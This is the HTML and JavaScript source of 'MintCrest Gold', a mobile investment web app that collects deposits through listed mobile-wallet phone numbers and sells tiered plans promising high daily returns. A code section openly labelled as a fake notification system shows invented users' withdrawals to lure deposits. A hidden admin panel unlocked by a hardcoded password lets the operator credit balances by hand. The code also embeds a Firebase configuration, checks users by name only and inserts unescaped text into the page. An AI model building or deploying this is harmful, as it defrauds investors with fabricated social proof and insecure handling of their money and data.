<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-storage-compat.js"></script>
    <title>MintCrest Gold | Official Global Node</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&display=swap');
        :root { --p: #00f2fe; --s: #7000ff; --gold: #f6d365; }
        body { font-family: 'Plus Jakarta Sans', sans-serif; background: #010409; color: white; overflow-x: hidden; scroll-behavior: smooth; }
        
        /* Smooth UI & Layout */
        .glass { background: rgba(255, 255, 255, 0.02); backdrop-filter: blur(25px); border: 1px solid rgba(255,255,255,0.08); }
        .grad-main { background: linear-gradient(135deg, #00f2fe 0%, #4facfe 100%); }
        .grad-neon { background: linear-gradient(135deg, #7000ff 0%, #00f2fe 100%); }
        .neon-text { text-shadow: 0 0 10px rgba(0, 242, 254, 0.5); }
        
        /* Mobile Optimization */
        .page { display: none; animation: fadeIn 0.4s ease-out; }
        .active-page { display: block; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        
        .nav-btn { transition: 0.3s; opacity: 0.4; filter: grayscale(1); }
        .active-tab { opacity: 1; filter: grayscale(0); transform: scale(1.1); color: var(--p); }

        /* Fake Notification Pop */
        #fake-notif { position: fixed; top: -100px; left: 50%; transform: translateX(-50%); z-index: 10000; transition: 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
        #fake-notif.show { top: 20px; }

        input { background: rgba(255,255,255,0.05) !important; border: 1px solid rgba(255,255,255,0.1) !important; color: white !important; }
        ::-webkit-scrollbar { display: none; }
    </style>
</head>
<body class="h-screen flex flex-col">

    <div id="fake-notif" class="glass px-6 py-4 rounded-3xl flex items-center gap-4 border-l-4 border-cyan-400 w-[90%] max-w-sm">
        <div class="bg-cyan-500/20 p-2 rounded-full">💰</div>
        <div>
            <p id="notif-user" class="text-[10px] font-black text-cyan-400 uppercase">User123</p>
            <p id="notif-msg" class="text-[8px] font-bold text-white/70">Successfully withdrawn ₨ 5,400</p>
        </div>
    </div>

    <section id="auth-ui" class="fixed inset-0 z-[10000] bg-[#010409] flex flex-col items-center justify-center p-8">
        <h1 onclick="adminTap()" class="text-5xl font-black italic mb-2 tracking-tighter neon-text">MINTCREST</h1>
        <p class="text-[8px] tracking-[0.5em] text-cyan-500/40 mb-12 font-bold uppercase">Authorized Access Only</p>
        <div class="glass p-10 rounded-[3rem] w-full max-w-sm">
            <input type="text" id="user-name" placeholder="IDENTIFICATION" class="w-full p-5 rounded-2xl mb-4 text-center text-xs font-black uppercase">
            <button onclick="login()" class="w-full grad-main py-5 rounded-2xl font-black text-[10px] uppercase text-black">Unlock Node</button>
        </div>
    </section>

    <header class="p-6 flex justify-between items-center fixed top-0 w-full z-50 bg-[#010409]/80 backdrop-blur-lg">
        <div class="flex items-center gap-3">
            <div class="w-10 h-10 grad-main rounded-xl flex items-center justify-center font-black text-black">M</div>
            <span class="font-black text-sm tracking-widest italic">MINTCREST</span>
        </div>
        <button onclick="logout()" class="glass px-4 py-2 rounded-full text-[8px] font-black uppercase border-red-500/30 text-red-400">Logout</button>
    </header>

    <main id="app-ui" class="hidden flex-1 overflow-y-auto pt-24 pb-32">
        
        <div id="p-home" class="page active-page p-6">
            <div class="grad-neon p-10 rounded-[3.5rem] mb-6 shadow-2xl relative overflow-hidden">
                <p class="text-[9px] text-white/50 font-black uppercase">Available Liquidity</p>
                <h2 class="text-5xl font-black tracking-tighter" id="v-bal">₨ 0</h2>
                <div class="mt-8 flex justify-between items-end">
                    <div><p class="text-[8px] opacity-60 font-black uppercase">Yield Profit</p><p class="text-xl font-black text-cyan-300" id="v-profit">₨ 0</p></div>
                    <button onclick="dailyBonus()" class="bg-black/30 px-6 py-3 rounded-2xl text-[9px] font-black uppercase">Bonus 🎁</button>
                </div>
            </div>

            <marquee class="mb-6 text-cyan-400 font-black text-[9px] uppercase tracking-widest italic" id="ticker-text">Welcome to MintCrest - Trade the Future</marquee>

            <div class="grid grid-cols-2 gap-4 mb-6">
                <button onclick="changePage('wallet')" class="glass p-8 rounded-[2.5rem] border-b-4 border-cyan-400">
                    <span class="text-2xl block mb-2">📥</span>
                    <span class="text-[10px] font-black uppercase">Deposit</span>
                </button>
                <button onclick="changePage('withdraw')" class="glass p-8 rounded-[2.5rem] border-b-4 border-purple-500">
                    <span class="text-2xl block mb-2">📤</span>
                    <span class="text-[10px] font-black uppercase">Withdraw</span>
                </button>
            </div>

            <div class="glass p-6 rounded-[2.5rem] mb-6">
                <div class="flex gap-2">
                    <input type="text" id="promo-input" placeholder="PROMO CODE" class="flex-1 p-4 rounded-xl text-[10px] font-bold text-center">
                    <button onclick="applyPromo()" class="grad-main text-black px-6 rounded-xl font-black text-[9px] uppercase">Apply</button>
                </div>
            </div>

            <div class="grid grid-cols-2 gap-4">
                <a href="https://wa.me/yourgroup" class="glass p-4 rounded-2xl flex items-center justify-center gap-2 border-green-500/20">
                    <span class="text-green-400 text-lg">💬</span>
                    <span class="text-[9px] font-black uppercase">Group Link</span>
                </a>
                <button onclick="changePage('help')" class="glass p-4 rounded-2xl flex items-center justify-center gap-2">
                    <span class="text-yellow-400 text-lg">🎧</span>
                    <span class="text-[9px] font-black uppercase">Help Desk</span>
                </button>
            </div>
        </div>

        <div id="p-invest" class="page p-6">
            <h3 class="text-center font-black text-cyan-400 uppercase italic mb-8 tracking-tighter text-xl">Asset Portfolios (25)</h3>
            <div id="plans-grid" class="space-y-4"></div>
        </div>

        <div id="p-help" class="page p-6">
            <div class="glass p-8 rounded-[3rem]">
                <h3 class="text-center font-black text-yellow-400 mb-6 uppercase">Message Admin</h3>
                <textarea id="help-msg" class="w-full h-32 p-4 rounded-2xl mb-4 text-xs font-bold" placeholder="Type your issue..."></textarea>
                <button onclick="sendMessage()" class="w-full grad-main py-5 rounded-2xl text-black font-black text-[10px] uppercase">Send Message</button>
                <div id="admin-replies" class="mt-8 space-y-4"></div>
            </div>
        </div>

        <div id="p-wallet" class="page p-6">
            <div class="glass p-8 rounded-[3rem] border-t-8 border-cyan-400 shadow-2xl">
                <h3 class="text-center font-black text-cyan-400 uppercase italic mb-8">Funding</h3>
                <div class="space-y-3 mb-8 text-[9px] font-black uppercase">
                    <div class="flex justify-between p-4 bg-white/5 rounded-2xl border border-white/5"><span>Jazz/Sada</span><span class="text-cyan-400">03705519562</span></div>
                    <div class="flex justify-between p-4 bg-white/5 rounded-2xl border border-white/5"><span>Easypaisa</span><span class="text-green-400">03379827882</span></div>
                </div>
                <input type="number" id="d-amt" placeholder="Amount (PKR)" class="w-full p-5 rounded-2xl mb-4 text-center font-bold">
                <input type="text" id="d-tid" placeholder="TID Number" class="w-full p-5 rounded-2xl mb-6 text-center font-bold uppercase">
                <input type="file" id="d-file" accept="image/*" class="w-full p-4 mb-6 text-[9px] uppercase">
                <button onclick="subDep()" class="w-full grad-main py-5 rounded-2xl font-black text-[10px] uppercase text-black">Confirm Capital</button>
            </div>
        </div>

        <div id="p-withdraw" class="page p-6">
            <div class="glass p-10 rounded-[3rem] border-t-8 border-purple-500 text-center">
                <h3 class="font-black text-purple-500 mb-6 uppercase text-xl italic">Liquidation</h3>
                <input type="number" id="w-amt" placeholder="Amount (PKR)" class="w-full p-5 rounded-2xl mb-4 text-center font-bold">
                <input type="text" id="w-acc" placeholder="Account Details" class="w-full p-5 rounded-2xl mb-10 text-center font-bold">
                <button onclick="subWd()" class="w-full bg-purple-600 py-5 rounded-2xl font-black text-[10px] uppercase">Request Payout</button>
            </div>
        </div>

        <div id="p-info" class="page p-6">
            <div class="glass p-8 rounded-[3rem] space-y-8 text-[10px] leading-relaxed opacity-80">
                <div><h4 class="text-cyan-400 font-black mb-2 uppercase">About Company</h4><p>MintCrest Gold is a global asset node providing high-yield liquidity solutions to digital investors since 2026.</p></div>
                <div><h4 class="text-purple-400 font-black mb-2 uppercase">Privacy Policy</h4><p>We use end-to-end encryption for all transactions. Your data is stored on decentralized nodes.</p></div>
                <div><h4 class="text-yellow-400 font-black mb-2 uppercase">Terms</h4><p>Withdrawals take up to 24 hours. Daily profit is calculated every midnight PKT.</p></div>
            </div>
        </div>

    </main>

    <div id="admin-panel" class="fixed inset-0 bg-black z-[50000] hidden overflow-y-auto pb-32">
        <div class="p-8 border-b border-white/10 flex justify-between bg-black sticky top-0">
            <h2 class="text-xl font-black text-cyan-400 uppercase italic">Control Node</h2>
            <button onclick="closeAdmin()" class="bg-red-600 px-6 py-2 rounded-xl text-[9px] font-black">LOCK</button>
        </div>
        <div class="p-6 space-y-6">
            <div class="flex gap-2">
                <button onclick="admTab('req')" class="flex-1 grad-main py-4 rounded-xl text-black font-black text-[9px] uppercase">Requests</button>
                <button onclick="admTab('tools')" class="flex-1 glass py-4 rounded-xl font-black text-[9px] uppercase">Admin Tools</button>
            </div>
            
            <div id="adm-req" class="space-y-4"></div>

            <div id="adm-tools" class="hidden space-y-4">
                <div class="glass p-6 rounded-2xl">
                    <h4 class="text-[10px] font-black uppercase mb-4 text-cyan-400">Manual User Edit</h4>
                    <input type="text" id="am-u" placeholder="User Name" class="w-full p-4 mb-2 text-xs">
                    <input type="number" id="am-v" placeholder="Amount" class="w-full p-4 mb-4 text-xs">
                    <div class="flex gap-2">
                        <button onclick="manEd('balance')" class="flex-1 bg-white text-black p-3 rounded-lg text-[8px] font-black">ADD BAL</button>
                        <button onclick="manEd('profit')" class="flex-1 bg-cyan-500 text-black p-3 rounded-lg text-[8px] font-black">ADD PROFIT</button>
                    </div>
                </div>
                <div class="glass p-6 rounded-2xl">
                    <h4 class="text-[10px] font-black uppercase mb-4 text-yellow-400">Promo Code Node</h4>
                    <input type="text" id="am-p" placeholder="CODE NAME" class="w-full p-4 mb-2 text-xs">
                    <input type="number" id="am-pv" placeholder="Amount" class="w-full p-4 mb-4 text-xs">
                    <button onclick="createP()" class="w-full bg-yellow-500 text-black p-4 rounded-lg text-[9px] font-black">ACTIVATE CODE</button>
                </div>
            </div>
        </div>
    </div>

    <nav id="bottom-nav" class="hidden glass p-8 flex justify-around items-center fixed bottom-0 w-full z-[4000] rounded-t-[3.5rem] border-t border-white/10 shadow-2xl">
        <button onclick="changePage('home')" id="n-home" class="nav-btn active-tab text-2xl">🏠</button>
        <button onclick="changePage('invest')" id="n-invest" class="nav-btn text-2xl">🚀</button>
        <button onclick="changePage('info')" id="n-info" class="nav-btn text-2xl">📜</button>
        <button onclick="changePage('wallet')" id="n-wallet" class="nav-btn text-2xl">💰</button>
    </nav>

    <script>
        // CONFIG
        const firebaseConfig = { apiKey: "AIzaSyDt3ChZHyDdtM4Ir1oXRZJUywcOiV30Wtg", authDomain: "investment-84f4e.firebaseapp.com", projectId: "investment-84f4e", storageBucket: "investment-84f4e.firebasestorage.app", messagingSenderId: "975293889308", appId: "1:975293889308:web:6d034a99cc966c75ff58d9" };
        firebase.initializeApp(firebaseConfig); const db = firebase.firestore(); const storage = firebase.storage();
        let user = null; let tapCount = 0;

        // 25+5 PLANS GENERATOR
        const plans = [];
        for(let i=1; i<=25; i++) {
            plans.push({ name: `Elite Tier ${i}`, price: 200 * i, daily: (10 + (i*0.5)).toFixed(1), days: 30 });
        }

        function renderPlans() {
            const container = document.getElementById('plans-grid'); container.innerHTML = '';
            plans.forEach(p => {
                container.innerHTML += `<div onclick="buyPlan(${p.price}, '${p.name}')" class="glass p-6 rounded-[2rem] flex justify-between items-center active:scale-95 transition-all">
                    <div><h4 class="font-black text-[10px] uppercase">${p.name}</h4><p class="text-[8px] text-cyan-400 font-bold">₨ ${p.daily}/Day • ${p.days} Days</p></div>
                    <div class="text-lg font-black italic text-white">₨ ${p.price}</div>
                </div>`;
            });
        }

        // AUTH & LOGIC
        async function login() {
            const n = document.getElementById('user-name').value.trim().toLowerCase(); if(!n) return;
            localStorage.setItem('mc_user', n);
            const ref = db.collection("users").doc(n); const d = await ref.get();
            if(!d.exists) await ref.set({ name: n, balance: 0, profit: 0, lastBonus: 0, time: Date.now(), redeemed: [] });
            document.getElementById('auth-ui').classList.add('hidden'); document.getElementById('app-ui').classList.remove('hidden'); document.getElementById('bottom-nav').classList.remove('hidden');
            sync(n); renderPlans(); startFakeNotif();
        }

        function logout() { localStorage.removeItem('mc_user'); location.reload(); }

        function sync(n) {
            db.collection("users").doc(n).onSnapshot(d => { user = d.data(); document.getElementById('v-bal').innerText = "₨ "+user.balance.toLocaleString(); document.getElementById('v-profit').innerText = "₨ "+user.profit.toLocaleString(); });
            db.collection("settings").doc("news").onSnapshot(d => { if(d.exists) document.getElementById('ticker-text').innerText = d.data().msg; });
            db.collection("help").where("user", "==", n).orderBy("time", "desc").onSnapshot(s => {
                const list = document.getElementById('admin-replies'); list.innerHTML = '';
                s.forEach(doc => { const m = doc.data(); list.innerHTML += `<div class="p-4 rounded-xl bg-white/5 text-[9px] mb-2 font-bold ${m.from==='admin'?'border-l-4 border-cyan-400':''}"><p class="opacity-50">${m.from==='admin'?'ADMIN':'YOU'}</p><p class="mt-1">${m.message}</p></div>`; });
            });
        }

        async function dailyBonus() {
            const now = Date.now();
            if(now - (user.lastBonus || 0) < 86400000) return alert("Wait 24h for next bonus! 😘");
            const reward = Math.floor(Math.random() * 50) + 10;
            await db.collection("users").doc(user.name).update({ balance: firebase.firestore.FieldValue.increment(reward), lastBonus: now });
            alert(`Sweetie! ₨ ${reward} added to vault! 😘`);
        }

        async function applyPromo() {
            const c = document.getElementById('promo-input').value.trim().toUpperCase(); if(!c) return;
            const ref = db.collection("promos").doc(c); const d = await ref.get();
            if(!d.exists || (user.redeemed && user.redeemed.includes(c))) return alert("Invalid or Used Code! 😘");
            await db.collection("users").doc(user.name).update({ balance: firebase.firestore.FieldValue.increment(d.data().val), redeemed: firebase.firestore.FieldValue.arrayUnion(c) });
            alert("Promo Applied! 😘");
        }

        async function subDep() {
            const a = document.getElementById('d-amt').value; const t = document.getElementById('d-tid').value; const f = document.getElementById('d-file').files[0];
            if(!a || !t || !f) return alert("Photo required! 😘");
            try {
                const sRef = storage.ref(`receipts/${Date.now()}_${user.name}`);
                await sRef.put(f); const url = await sRef.getDownloadURL();
                await db.collection("requests").add({ user: user.name, amount: parseInt(a), tid: t, proof: url, type: "deposit", status: "pending", time: Date.now() });
                alert("Deposit Received! 😘"); changePage('home');
            } catch(e) { alert("Error!"); }
        }

        async function subWd() {
            const a = parseInt(document.getElementById('w-amt').value); const acc = document.getElementById('w-acc').value;
            if(!a || a > user.balance || !acc) return alert("Check balance! 😘");
            await db.collection("users").doc(user.name).update({ balance: user.balance - a });
            await db.collection("requests").add({ user: user.name, amount: a, acc: acc, type: "withdraw", status: "pending", time: Date.now() });
            alert("Requested! 😘"); changePage('home');
        }

        async function sendMessage() {
            const m = document.getElementById('help-msg').value; if(!m) return;
            await db.collection("help").add({ user: user.name, from: "user", message: m, time: Date.now() });
            document.getElementById('help-msg').value = ''; alert("Sent to Admin! 😘");
        }

        // ADMIN CORE
        function adminTap() { tapCount++; if(tapCount >= 5) { if(prompt("Pass:") === "mint786") { document.getElementById('admin-panel').classList.remove('hidden'); syncAdm(); } tapCount=0; } }
        function closeAdmin() { document.getElementById('admin-panel').classList.add('hidden'); }
        function admTab(s) { document.querySelectorAll('#adm-req, #adm-tools').forEach(x=>x.classList.add('hidden')); document.getElementById('adm-'+s).classList.remove('hidden'); }

        async function syncAdm() {
            db.collection("requests").where("status", "==", "pending").onSnapshot(s => {
                const rl = document.getElementById('adm-req'); rl.innerHTML = '';
                s.forEach(doc => {
                    const x = doc.data(); rl.innerHTML += `<div class="glass p-6 rounded-3xl mb-4 border border-white/10">
                        <div class="flex justify-between font-black uppercase text-[10px] mb-2"><span class="text-cyan-400">${x.user}</span><span>₨ ${x.amount}</span></div>
                        <p class="text-[8px] opacity-40 mb-3">${x.type} | ${x.tid||x.acc}</p>
                        ${x.proof ? `<a href="${x.proof}" target="_blank" class="block grad-main text-black text-center py-4 rounded-xl text-[9px] font-black uppercase mb-4">VIEW RECEIPT</a>` : ''}
                        <div class="flex gap-2">
                            <button onclick="hndReq('${doc.id}','${x.user}',${x.amount},'approved','${x.type}')" class="flex-1 bg-white text-black py-4 rounded-xl text-[9px] font-black uppercase">Approve</button>
                            <button onclick="hndReq('${doc.id}','${x.user}',${x.amount},'rejected','${x.type}')" class="flex-1 bg-red-600 py-4 rounded-xl text-[9px] font-black uppercase">Reject</button>
                        </div>
                    </div>`;
                });
            });
        }

        async function hndReq(id, u, amt, act, type) {
            if(act==='approved' && type==='deposit') await db.collection("users").doc(u).update({ balance: firebase.firestore.FieldValue.increment(amt) });
            else if(act==='rejected' && type==='withdraw') await db.collection("users").doc(u).update({ balance: firebase.firestore.FieldValue.increment(amt) });
            await db.collection("requests").doc(id).update({ status: act });
        }

        async function createP() { const c = document.getElementById('am-p').value.toUpperCase(); const v = parseInt(document.getElementById('am-pv').value); await db.collection("promos").doc(c).set({ val: v }); alert("Promo Live! 😘"); }
        async function manEd(f) { const u = document.getElementById('am-u').value.toLowerCase(); const v = parseInt(document.getElementById('am-v').value); await db.collection("users").doc(u).update({ [f]: firebase.firestore.FieldValue.increment(v) }); alert("Updated! 😘"); }

        // FAKE NOTIFICATIONS SYSTEM
        function startFakeNotif() {
            const users = ["Ali_786", "Imran_Pro", "Sarah_Invest", "Zain_King", "Ayesha_Node", "Kamran_Expert"];
            const msgs = ["withdrawn ₨ 1,200", "purchased Elite Tier 5", "redeemed ₨ 500 bonus", "withdrawn ₨ 10,000", "purchased Elite Tier 20"];
            
            setInterval(() => {
                const u = users[Math.floor(Math.random()*users.length)];
                const m = msgs[Math.floor(Math.random()*msgs.length)];
                document.getElementById('notif-user').innerText = u;
                document.getElementById('notif-msg').innerText = "Successfully " + m;
                document.getElementById('fake-notif').classList.add('show');
                setTimeout(() => document.getElementById('fake-notif').classList.remove('show'), 4000);
            }, 15000);
        }

        async function buyPlan(p, n) { if(user.balance < p) { alert("Insufficient Balance! 😘"); changePage('wallet'); } else { if(confirm(`Activate ${n}?`)) { await db.collection("users").doc(user.name).update({ balance: user.balance - p }); await db.collection("requests").add({ user: user.name, amount: p, type: "Plan: "+n, status: "approved", time: Date.now() }); alert("Plan Activated! 😘"); } } }
        function changePage(p) { document.querySelectorAll('.page').forEach(pg=>pg.classList.remove('active-page')); document.getElementById('p-'+p).classList.add('active-page'); document.querySelectorAll('.nav-btn').forEach(b=>b.classList.remove('active-tab')); document.getElementById('n-'+p).classList.add('active-tab'); }
    </script>
</body>
</html>
